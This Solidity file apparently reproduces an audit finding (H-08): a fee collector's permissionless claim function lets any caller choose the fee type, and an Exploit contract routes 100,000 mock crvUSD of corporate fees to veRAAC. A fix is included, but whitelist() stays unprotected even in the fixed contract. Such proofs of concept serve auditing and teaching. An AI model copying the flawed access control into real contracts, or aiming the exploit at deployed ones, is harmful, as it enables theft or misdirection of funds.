// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum Aurum — H-08 (Pashov, 2025-06-26)
    FeeCollector.claimNFTUnderlying is permissionless. The caller picks feeType.
    ROYALTY_FEE pays veRAAC. CORP_REVENUE pays RAAC corp.
    100,000 crvUSD of NFT mint fees meant for the corp are sent to veRAAC.
    The control collector is onlyOwner and ignores the caller's feeType. */

contract CrvUsd {
    string public symbol = "crvUSD";
    uint8 public constant decimals = 18;
    address public minter;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract VeSink {
    // balance lives on the token
}

contract FeeSource {
    function approve(CrvUsd token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }
}

contract FeeCollector {
    bytes32 public constant ROYALTY_FEE = keccak256("ROYALTY_FEE");
    bytes32 public constant CORP_REVENUE = keccak256("CORP_REVENUE");
    CrvUsd public token;
    address public corp;
    address public veRaac;
    mapping(address => bool) public whitelisted;
    bool public paused;
    uint256 private locked;

    modifier nonReentrant() {
        require(locked == 0, "reentrancy");
        locked = 1;
        _;
        locked = 0;
    }

    modifier whenNotPaused() {
        require(!paused, "paused");
        _;
    }

    constructor(CrvUsd _token, address _corp, address _ve) {
        token = _token;
        corp = _corp;
        veRaac = _ve;
    }

    function whitelist(address target) external {
        whitelisted[target] = true;
    }

    function claimCollectorRewards(address _token, address target, bytes32 feeType)
        external
        nonReentrant
        whenNotPaused
        returns (bool)
    {
        return _pullAndSplit(_token, target, token.balanceOf(target), feeType);
    }

    function claimNFTUnderlying(address _token, address target, uint256 amount, bytes32 feeType)
        external
        nonReentrant
        whenNotPaused
        returns (bool)
    {
        return _pullAndSplit(_token, target, amount, feeType);
    }

    function _pullAndSplit(address _token, address target, uint256 amount, bytes32 feeType) internal returns (bool) {
        require(whitelisted[target], "target");
        require(CrvUsd(_token).transferFrom(target, address(this), amount), "pull");
        // @> VULN: no onlyOwner. The caller-supplied feeType chooses who receives the fees.
        if (feeType == ROYALTY_FEE) {
            require(CrvUsd(_token).transfer(veRaac, amount), "ve");
        } else if (feeType == CORP_REVENUE) {
            require(CrvUsd(_token).transfer(corp, amount), "corp");
        } else {
            revert("fee");
        }
        // FIX: require(msg.sender == owner) and ignore the caller's feeType.
        return true;
    }
}

contract FeeCollectorFixed {
    CrvUsd public token;
    address public owner;
    address public corp;
    mapping(address => bool) public whitelisted;

    constructor(CrvUsd _token, address _corp) {
        token = _token;
        corp = _corp;
        owner = msg.sender;
    }

    function whitelist(address target) external {
        whitelisted[target] = true;
    }

    function claimNFTUnderlying(address _token, address target, uint256 amount, bytes32) external returns (bool) {
        require(msg.sender == owner, "owner");
        require(whitelisted[target], "target");
        require(CrvUsd(_token).transferFrom(target, address(this), amount), "pull");
        require(CrvUsd(_token).transfer(corp, amount), "corp");
        return true;
    }
}

contract Exploit {
    CrvUsd public token; // nonce 1
    VeSink public ve; // nonce 2
    VeSink public corp; // nonce 3
    FeeSource public source; // nonce 4
    FeeCollector public collector; // nonce 5
    uint256 public constant FEES = 100_000 ether;

    constructor() {
        token = new CrvUsd();
        ve = new VeSink();
        corp = new VeSink();
        source = new FeeSource();
        collector = new FeeCollector(token, address(corp), address(ve));
        collector.whitelist(address(source));
        token.mint(address(source), FEES);
        source.approve(token, address(collector), FEES);
    }

    function run() external {
        uint256 beforeVe = token.balanceOf(address(ve));
        collector.claimNFTUnderlying(address(token), address(source), FEES, collector.ROYALTY_FEE());
        require(token.balanceOf(address(ve)) - beforeVe == FEES, "ve took the corp fees");
        require(token.balanceOf(address(corp)) == 0, "corp received nothing");
        require(token.balanceOf(address(source)) == 0, "source still holds fees");
    }
}
